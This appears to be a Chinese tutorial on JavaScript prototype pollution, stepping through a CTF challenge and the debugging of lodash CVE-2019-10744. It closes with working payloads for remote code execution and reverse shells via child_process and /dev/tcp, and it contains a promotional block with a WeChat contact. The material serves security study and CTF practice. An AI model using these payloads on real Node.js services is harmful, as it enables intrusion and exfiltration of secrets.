### 1.JS原型和继承机制

##### 0> 原型及其搜索机制

  * NodeJS原型机制，比较官方的定义：

> 我们创建的每个函数都有一个 prototype（原型）属性，这个属性是一个指针，指向一个对象，
>
> 而这个对象的用途是包含可以由特定类型的所有实例共享的属性和方法

设计原型的初衷无非是对于每个实例对象，其拥有的共同属性没必要对每个对象实例再分配一片内存来存放这个属性。而可以上升到所有对象共享这个属性，而这个属性的实体在内存中也仅仅只有一份。

而原型机制恰好满足这种需求。

> 打个不太恰当的比喻，对于每个对象，都有其原型对象作为 **共享仓库** ，共享仓库中有属性和方法供生产每个对象实例时使用

##### 1> 原型链和继承

  * 原型链

> 原型链是在原型上实现继承的一种形式

举个例子:

    
    
    function Father(){  
    this.name = "father";  
    this.age = 66;  
    }  
    ​  
    function Son(){  
    this.name = "son";  
    }  
    ​  
    var father1 = new Father();  
    ​  
    Son.prototype = father1;  
    ​  
    var son1 = new Son();  
    ​  
    console.log(son1);  
    console.log(son1.__proto__);  
    console.log(son1.__proto__.__proto__);  
    console.log(son1.__proto__.__proto__.__proto__);  
    console.log(son1.__proto__.__proto__.__proto__.__proto__);  
    ​  
    ​  
    /*  
    Father { name: 'son' }  
    Father { name: 'father', age: 66 }  
    {}  
    [Object: null prototype] {}         
    null  
    */  
    ​

整个的原型继承链如下：

![image-20230501151612259](https://image.3001.net/images/20230505/1683276130_6454c162043625c27c2ca.png!small)

  * 关于原型搜索机制：

1）搜索当前实例属性

2）搜索当前实例的原型属性

3）迭代搜索直至null

【----帮助网安学习，以下所有学习资料免费领！加vx：yj009991，备注“freebuf”获取！】

① 网安学习成长路径思维导图  
② 60+网安经典常用工具包  
③ 100+SRC漏洞分析报告  
④ 150+网安攻防实战技术电子书  
⑤ 最权威CISSP 认证考试指南+题库  
⑥ 超1800页CTF实战技巧手册  
⑦ 最新网安大厂面试题合集（含答案）  
⑧ APP客户端安全检测指南（安卓+IOS）

> 在上面的例子中
    
    
    console.log(son1.name);  
    console.log(son1.age);  
    /*  
    son  
    66   
    */

##### 2> 内置对象的原型

这个也是多级原型链污染的基础

> 拿一张业内很经典的图来看看

![](https://image.3001.net/images/20230515/1684133766_6461d786d81881fa95cee.jpg!small)  

### 2.姿势利用

##### 1>利用原型污染进行RCE

    
    
    global.process.mainModule.constructor._load('child_process').execSync('calc')

![image-20230501153417183](https://image.3001.net/images/20230505/1683276131_6454c1633e3fa8a965b1b.png!small)

##### 2>多级污染

在 **ctfshow Web340** 中有这么一题：

    
    
    /* login.js */  
    var user = new function(){  
    this.userinfo = new function(){  
    this.isVIP = false;  
    this.isAdmin = false;  
    this.isAuthor = false;       
    };  
    }  
    utils.copy(user.userinfo,req.body);  
    if(user.userinfo.isAdmin){  
    res.end(flag);  
    }

由于`Function`原型对象的原型也是`Object`的原型，即

> `user --(__proto__)--> Function.prototype --(__proto__)--> Object.prototype`

那么就可以通过这个进行多级污染，payload为如下形式：

    
    
    {  
    "__proto__":{  
      "__proto__":{  
          attack_code  
      }  
    }  
    }

##### 3>Lodash模块的原型链污染（以lodash.defaultsDeep（CVE-2019-10744）为例，进行CVE复现）

> lodash版本 < 4.17.12
>
> CVE-2019-10744：在低版本中的lodash.defaultDeep函数中，Object对象可以被原型链污染，从而可以配合其他漏洞。

看下官方样例PoC的调试过程：

    
    
    const lodash = require('lodash');  
    const payload = '{"constructor": {"prototype": {"whoami": "hack"}}}'  
    ​  
    function check() {  
    lodash.defaultsDeep({}, JSON.parse(payload));  
    if (({})['whoami'] === "hack") {  
      console.log(`Vulnerable to Prototype Pollution via ${payload}`);  
      console.log(Object.prototype);  
    }  
    }  
    ​  
    check();

开始调试：

    
    
    在lodash中，baseRest是一个辅助函数，用于帮助创建一个接受可变数量参数的函数。

所以主体逻辑为，而这段匿名函数也将为`func`的函数的函数体

    
    
    args.push(undefined, customDefaultsMerge);  
    return apply(mergeWith, undefined, args);

![image-20230501172924114](https://image.3001.net/images/20230505/1683276133_6454c165313a1271d2b8e.png!small)

查看`overRest`

在变量监听中可以发现，传入的参数整合成一个参数对象`args`

![image-20230501165542755](https://image.3001.net/images/20230505/1683276134_6454c16692ed7e1883164.png!small)

继续往下`return apply`

![image-20230501200948397](https://image.3001.net/images/20230505/1683276135_6454c167eb98a2be7b922.png!small)

到`apply`后进入，是个使用`switch`并且根据参数个数作为依据

发现使用了`call`，这里可能是个 **进行原型链继承** 的可利用点。

(而这种技术称为 **借用构造函数** ，其思想就是通过子类构造函数中调用超类构造函数完成原型链继承)

    
    
    function Super(){}  
    function Sub(){  
    Super.call(this);           // 继承  
    }

然后`apply`中返回至刚才的匿名函数体中（此时刚执行完baseRest(func)）,其中`customDefaultMerge`为`merge`的声明方式

![image-20230501201429867](https://image.3001.net/images/20230505/1683276137_6454c16947deb0e6fe04b.png!small)

继续深入，由上可知`apply(func=mergeWith,thisArg=undefined,args=Array[4])`

![image-20230501202011773](https://image.3001.net/images/20230505/1683276138_6454c16a724f75f3eb7c6.png!small)

基于`start`的计算机制，不难得知`undefined`是作为占位符，使得`start`向后移动

![image-20230501203050752](https://image.3001.net/images/20230505/1683276139_6454c16bd641ac2f2b058.png!small)

继续调试，在NodeJS中，普通函数中调用`this`等同于调用全局对象`global`

![image-20230501203715075](https://image.3001.net/images/20230505/1683276141_6454c16d09cd854d92a16.png!small)

将`assigner`视为合并的一个黑盒函数即可，至此完成原型链污染。

![image-20230501204240350](https://image.3001.net/images/20230505/1683276142_6454c16e087f5123f4a27.png!small)

![image-20230501204336670](https://image.3001.net/images/20230505/1683276143_6454c16f1053f75c1d7bf.png!small)

> Question: 注意到PoC中的`lodash.defaultsDeep({},
> JSON.parse(payload));`是要求先传入一个`object`实例的(此处为`{}`)
>
> 所以还是具体分析一下合并的过程(来看下`assigner`的一些底层实现)
>
> 注意：通常而言，合并需要考虑深浅拷贝的问题
    
    
    /*baseMerge*/  
    function baseMerge(object, source, srcIndex, customizer, stack) {  
    if (object === source) {                  // 优化判断是否为同一对象，是则直接返回  
      return;  
    }  
        
      // 遍历source的属性，选择深浅复制  
        
    baseFor(source, function(srcValue, key) {  
      if (isObject(srcValue)) {  
        stack || (stack = new Stack);  
        baseMergeDeep(object, source, key, srcIndex, baseMerge, customizer, stack);  
      }  
      else {  
        var newValue = customizer  
          ? customizer(safeGet(object, key), srcValue, (key + ''), object, source, stack)  
          : undefined;  
    ​  
        if (newValue === undefined) {  
          newValue = srcValue;  
        }  
        assignMergeValue(object, key, newValue);  
      }  
    }, keysIn);  
    }
    
    
    var baseFor = createBaseFor();
    
    
    function createBaseFor(fromRight) {         // fromRight选择从哪端开始遍历         
    return function(object, iteratee, keysFunc) {  
      var index = -1,  
          iterable = Object(object),  
          props = keysFunc(object),  
          length = props.length;  
    ​  
      while (length--) {  
        var key = props[fromRight ? length : ++index];  
        if (iteratee(iterable[key], key, iterable) === false) {   // 这里的iteratee即为baseFor中的匿名函数  
          break;  
        }  
      }  
      return object;  
    };  
    }  
    ​

那我就再调试一下，在`iteratee`中（即匿名函数中），若为对象，则选择深拷贝。

![image-20230501214414062](https://image.3001.net/images/20230505/1683276144_6454c17066757102ca7bb.png!small)

原来在4.17.12之前的版本也是有waf的，只是比较弱。

![image-20230501214540947](https://image.3001.net/images/20230505/1683276145_6454c171985851cc6cb7a.png!small)

回归正题，在`customizer`之后便产生了合并

![image-20230501215807038](https://image.3001.net/images/20230505/1683276146_6454c172981646a461255.png!small)

所以，为了更好地观察，我将`{}`替换成`[]`(`Array`对象实例)

 **重新开始调试到此处并进入** ，发现这是一个迭代合并的过程，先判断是否都为对象。如果是的话，则会进行压栈然后开始浅拷贝合并。

![image-20230501220535024](https://image.3001.net/images/20230505/1683276147_6454c173af5b48253b9b8.png!small)

![image-20230501222217997](https://image.3001.net/images/20230505/1683276148_6454c174f1b9b7d993a39.png!small)

这是在生成属性时需要设置的四种 **数据属性**

![image-20230501221244986](https://image.3001.net/images/20230505/1683276149_6454c175e64b3859151e3.png!small)

回归正题，发现只能写入`Array`的原型

![image-20230501221644127](https://image.3001.net/images/20230505/1683276150_6454c176e0d2f8cd78bf6.png!small)

再验证一下

    
    
    const lodash = require('lodash');  
    const payload = '{"constructor": {"prototype": {"whoami": "hack"}}}'  
    ​  
    var object = new Object();  
    ​  
    function check() {  
    // JSON.parse(payload)之后是一个JS对象  
    lodash.defaultsDeep([],JSON.parse(payload));  
    if (({})['whoami'] === "hack") {  
      console.log(`Vulnerable to Prototype Pollution via ${payload}`);  
      console.log(Object.prototype);  
    }  
    }  
    ​  
    check();  
    ​  
    console.log(Array.prototype);

![image-20230501221752843](https://image.3001.net/images/20230505/1683276151_6454c177db3d08680a9d7.png!small)

所以说需要直接传入一个`Object`的实例。

> 官方修复，直接上waf：检测JSON中的payload中的key值
>
> 此处对比一下lodash4.17.12之前的版本，key值过滤得更为严格

![image-20230501210253505](https://image.3001.net/images/20230505/1683276152_6454c178c3633bc75df07.png!small)

> 总结一下，CVE-2019-10744可用的payload
    
    
    # 反弹shell  
    {"constructor":{"prototype":  
    {"outputFunctionName":"a=1;process.mainModule.require('child_process').exec('bash -c \"echo $FLAG>/dev/tcp/vps/port \"')//"}}}  
    ​  
    # RCE  
    // 对于某个object实例  
    {"__proto__":{"outputFunctionName":"a=1;return global.process.mainModule.constructor._load('child_process').execSync('cat /flag')//"}}  
    ​  
    # 反弹shell  
    {"__proto__":{"outputFunctionName":"_tmp1;global.process.mainModule.require('child_process').exec('bash -c \"bash -i >& /dev/tcp/vps/port 0>&1\"');var __tmp2"}}

###  **更多网安技能的在线实操练习，[请点击这里>>](https://www.hetianlab.com/)**

  

